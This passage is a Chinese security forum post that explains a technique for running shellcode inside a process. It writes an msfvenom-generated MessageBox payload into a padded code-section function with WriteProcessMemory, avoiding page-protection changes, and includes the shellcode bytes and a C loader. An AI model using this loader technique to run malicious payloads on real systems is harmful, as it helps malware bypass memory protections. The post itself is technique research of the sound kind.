@@ -1,0 +1,114 @@
+
+# [原创]《ret2pwn》技术利用新思路
+
+## 思路
+
+在群里看到大佬分享一篇文章《ret2pwn》，文章链接：<a href="elink@c6eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5M7X3g2@1x3Y4m8%4L8W2)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3i4K6u0r3M7s2u0G2j5$3g2K6M7#2)9J5k6r3W2F1k6h3y4@1K9h3!0F1i4K6u0r3">Process Injection without Write/Execute Permission | Ret2Pwn (xret2pwn.github.io)</a>
+
+作者利用`VirtualAlloc`函数和`WriteProcessMemory`函数及`VirtualProtect`函数，介绍了`ret2pwn`进程注入的方法.
+首先是用`VirtualAlloc`函数申请一块可读可执行但不可写的内存空间，然后利用`WriteProcessMemory`函数进行写入，而关于`WriteProcessMemory`函数，对于当前进程的可访问区域，只要该区域不被占用，那么就可以利用此函数进行内存写操作（参考MSDN: <a href="elink@80aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3P5X3S2Q4x3X3c8U0L8W2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3V1k6%4K9h3^5K6x3W2)9J5c8X3q4H3K9g2)9J5c8X3#2W2L8h3!0J5P5h3q4H3K9g2)9J5c8X3&6X3i4K6u0V1L8h3g2E0L8%4u0&6j5i4m8A6i4K6u0V1N6%4u0A6N6r3g2H3M7X3!0U0k6i4y4K6L8h3g2E0L8%4u0&6">WriteProcessMemory function (memoryapi.h) - Win32 apps | Microsoft Docs</a>），所以这种方法成功。
+
+然后是用`VirtualProtect`函数将申请空间改为只读权限，此过程要求关闭DEP，所以也成功了。
+根据以上思路，结合`傀儡进程技术思想`和`代码自修改SMC技术思想`实现了在当前进程空间，使用VS2019默认编译选项（保护全开）进行编译，将shellcode写入程序代码段，期间不需要任何页面保护属性的修改，且执行成功。
+具体实现步骤如下：
+
+### msf生成shellcode
+
+首先用msf生成shellcode
+
+```bash
+$ msfvenom -p windows/messagebox -f c
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+
+[-] No arch selected, selecting arch: x86 from the payload
+
+No encoder specified, outputting raw payload
+
+Payload size: 272 bytes
+
+Final size of c file: 1169 bytes
+
+unsigned char buf[] =
+
+"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
+
+"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
+
+"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
+
+"\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
+
+"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
+
+"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
+
+"\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
+
+"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
+
+"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
+
+"\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
+
+"\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
+
+"\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
+
+"\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
+
+"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"
+
+"\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3"
+
+"\x68\x58\x20\x20\x20\x68\x4d\x53\x46\x21\x68\x72\x6f\x6d\x20"
+
+"\x68\x6f\x2c\x20\x66\x68\x48\x65\x6c\x6c\x31\xc9\x88\x4c\x24"
+
+"\x10\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff"
+
+"\x55\x08";
+```
+
+### 编写测试程序
+
+`buf`的长度等于`_asm{}`中`_emit 0x00`的个数
+
+```
+#include <stdio.h>
+#include <Windows.h>
+// msfvenom -p windows/messagebox -f c
+// Payload size: 272 bytes
+unsigned char buf[] = "";
+void _declspec(naked) test()
+{
+// "_emit 0x00" * 272
+// buf size is 272
+_asm
+{
+_emit 0x00
+...
+_emit 0x00
+}
+}
+int main()
+{
+if (WriteProcessMemory(GetCurrentProcess(), test, buf, sizeof(buf), NULL)) {
+printf("[+] Write buf successfully.\n");
+}
+test();
+return 0;
+}
+```
+
+运行结果如下：
+
+![](upload/attach/202106/828287_3WV3HRG3GXEBHVP.png)
+
+## 小结
+
+这种方法提供了一种别样的思路，相对于傀儡进程技术，它可以少启动一个进程，相对于smc技术或者原作者介绍的技术，不需要复杂的页面属性修改，适合执行精简的shellcode，但对于内存加载exe/dll，这种拓展思路就显得吃力了，根据原作者的思路，结合PE文件结构，更胜一筹。
+
+至于这种技术的免杀，在此不做讨论。
+
+## 完整源代码
